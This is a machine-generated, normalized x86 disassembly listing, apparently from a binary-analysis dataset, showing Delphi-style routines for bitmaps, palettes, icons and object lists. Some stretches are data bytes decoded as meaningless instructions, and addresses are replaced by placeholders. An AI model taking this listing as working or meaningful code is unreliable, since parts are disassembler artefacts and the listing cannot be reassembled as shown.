mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42382d
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423834
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
sub_423864
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402fc4
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402fc4
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_423858
xor edx edx
push ebp
push sub_423a52
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_423724
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_423724
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_423a2b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_40859c
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_40859c
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_40859c
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_40859c
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_423790
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_423790
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a32
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_402764
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_402764
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_402764
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_402764
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
sub_423a32
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a59
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_423a60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_423ab0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_423b08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_423ab0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423b51
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_403608
mov edi eax
mov eax esi
call sub_403608
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423c8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_423c71
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_418914
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_418914
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_418914
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4086c8
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c78
mov al 0x1
sub_423ca8
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418dfc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423cf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423cf7
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_423cfc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_423d30
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_418dfc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423d7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d82
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
sub_423dac
push cs
or edx [ esi + eax * 2 + 0x69 ]
insb
inc esi
outsd
jb r-xdata
or al 0x64
popad
je r-xdata
dec ebp
clc
mov edx r-xdata
mov eax esi
call sub_423fc4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_423fc4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_423fc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f28
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404450
retn
dec esp
imul esi [ ebx + 0x74 ] 0x5500408d
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
inc ecx
add [ eax + 0x60 ] bh
inc ecx
add ah dh
pushad
inc ecx
add [ eax ] dl
push esp
inc esi
imul ebp [ ebp + 0x46 ] 0x616d726f
je r-xdata
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lea eax [ eax ]
and [ esi ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc edx
add [ eax ] dl
add [ eax ] al
add [ eax + 0x39 ] dh
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x3f ] bh
inc edx
add al cl
popad
inc ecx
add [ esp ] cl
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
lodsb [ esi ]
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423f21
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403690
push 0x0
mov eax [ r-xdata ]
add esp 0xfffffff0
call sub_403a24
sub_423e44
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423f21
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_403690
push 0x0
mov eax [ r-xdata ]
add esp 0xfffffff0
call sub_403a24
sub_423e7d
push eax
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_423fc4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_423fc4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_423fc4
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_423fc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f28
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404450
retn
sub_423fc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_424047
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_405214
mov esi eax
mov ebx esi
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_408794
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_404480
mov eax [ ebp + 0x8 ]
mov [ ebx ] eax
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404480
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov edx esi
mov eax edi
call sub_416044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42404e
lea eax [ ebp - 0xc ]
call sub_40442c
retn
sub_424058
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_4240df
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408794
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4044c4
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor ebx ebx
mov edx ebx
mov eax edi
call sub_4161a0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_404828
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov ebx [ esi ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4240e6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_4240f0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42416e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_4161a0
mov esi [ eax ]
lea edx [ ebp - 0x108 ]
mov eax esi
call sub_403610
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_404688
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404828
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424175
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_424180
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x10 ] ebx
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4242ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_40442c
mov eax [ ebp + 0x8 ]
call sub_40442c
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
cmp [ ebp - 0xc ] 0x1
jle r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4161a0
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_4038ec
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424306
lea eax [ ebp - 0x3c ]
call sub_40442c
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
push 0x2
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_406660
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_409744
dec esi
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
mov ebx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_4046ec
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_4046ec
mov eax [ ebp + 0x8 ]
push 0x2
mov eax [ edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x28 ]
mov eax edi
mov edx r-xdata
call sub_409744
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] 0xb
lea ecx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
mov edx r-xdata
call sub_409744
inc [ ebp - 0xc ]
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xc ]
call sub_408c70
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x8 ]
call sub_404480
sub_4243cc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ esi + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax esi
call sub_424478
mov ecx [ r-xdata ]
mov dx 0xe
mov eax esi
call sub_424478
mov ecx [ r-xdata ]
mov dx 0x2
mov eax esi
call sub_424478
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42444c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4036c0
mov eax [ esi + 0x8 ]
call sub_4036c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_424478
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ecx
call sub_416044
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4244bc
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_416044
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4244e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
mov edx ebx
mov eax [ esi + 0x8 ]
call sub_4161a0
cmp di ax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4161a0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_42455c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
call sub_42451c
call sub_42453c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_42459c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416a58
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_4245cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_403608
mov edx eax
mov eax [ ebx + 0xc ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416b68
pop esi
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub_424600
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0xc ]
mov eax esi
mov edx edi
call sub_40384c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036c0
xor eax eax
mov [ ebx + 0xc ] eax
mov dl 0x1
mov eax edi
call [ eax + 0x48 ]
mov esi eax
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4038d4
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] ebx
mov eax ebx
mov dx 0xfffc
call sub_4038d4
mov [ esi + 0x18 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4038bc
sub_42467c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test esi esi
je r-xdata
xor eax eax
push ebp
push sub_42470c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
call sub_4036c0
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403608
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
push eax
mov eax ebx
mov dx 0xfffd
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42472c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_424850
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_408ed4
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_40497c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_424058
test eax eax
jne r-xdata
mov dl 0x1
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4247ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfdc
call sub_403e8c
mov eax [ ebx + 0xc ]
call sub_4036c0
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4038d4
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424857
lea eax [ ebp - 0x14 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_424860
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ rw-data ]
call sub_4244e0
mov esi eax
test esi esi
jne r-xdata
mov dl 0x1
mov eax esi
call [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4248d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x1c ] ebx
push eax
mov eax ebx
mov dx 0xfffc
call sub_4038d4
mov edx eax
pop eax
mov [ eax + 0x18 ] edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
call sub_4227a8
mov eax [ ebx + 0xc ]
call sub_4036c0
mov esi [ ebp - 0x8 ]
mov [ ebx + 0xc ] esi
mov [ esi + 0x14 ] ebx
mov eax ebx
mov dx 0xfffd
call sub_4038d4
mov [ esi + 0x10 ] eax
mov edx ebx
mov eax ebx
mov si 0xfffd
call sub_4038bc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_424924
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi eax
mov edi [ esi + 0xc ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
sub_424998
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
xor edx edx
mov eax esi
call sub_42467c
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx [ ebx + 0xc ]
mov eax esi
call sub_42467c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416a84
mov edx ebx
mov eax esi
call sub_42467c
jmp r-xdata
pop esi
pop ebx
retn
sub_4249f4
push ebx
mov ebx eax
cmp [ ebx + 0x12 ] 0x0
je r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_424a18
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x22 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
